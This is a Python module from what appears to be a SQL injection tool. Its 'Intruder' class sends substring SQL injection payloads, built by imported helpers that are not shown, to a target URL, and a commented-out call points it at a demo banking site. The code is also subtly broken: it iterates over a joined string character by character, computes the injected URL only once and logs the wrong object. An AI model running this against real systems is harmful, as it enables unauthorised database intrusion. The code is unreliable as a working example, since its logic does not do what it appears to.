import os
import sys
sys.path.append(os.getcwd())
from lib.core.payloads.makesetsqlpayload import make_set_sql_payload
from lib.core.payloads.substringpayload import sub_string_sql_inj
from utilis._regex.extractparam import replace_url_parameter
from lib.core.request.POSt.post import SubData
from lib.core.request.GET.get import Get
from lib.logger.log import logger

class Intruder(
    object
):

    def __init__(self,host,port):
        self.host = host
        self.port = port
        self.payload = None
        self.result = []
        self.datasub = SubData(self.host,self.port)
        self.payload_url = None


    def send_payload_substring(self):
        if self.payload is None:
            rows = sub_string_sql_inj().split("\n") 
            sorted_rows = sorted(rows) 
            sorted_payload = "\n".join(sorted_rows)
            self.payload = sorted_payload
        
        for payload in self.payload:
            req = self.datasub.submit_data(self.host,payload)
            self.result.append(self.datasub)
            logger.info(self.result)
            print(req)
    
    def send_substring_payload_requests_lib(self):
        try:
            import requests
            if self.payload is None:
                rows = sub_string_sql_inj().split("\n") 
                sorted_rows = sorted(rows) 
                sorted_payload = "\n".join(sorted_rows)
                self.payload = sorted_payload
            
            for payload in self.payload:
                if self.payload_url is None:
                    self.payload_url,_ = replace_url_parameter(self.host,payload)
                req = requests.get(self.payload_url)
                print(self.payload_url)
        
        except Exception as e:
            print(e)
                


# obj = Intruder("http://testfire.net/index.jsp?content=business_deposit.htm",8080)
# obj.send_payload_substring()
        
        


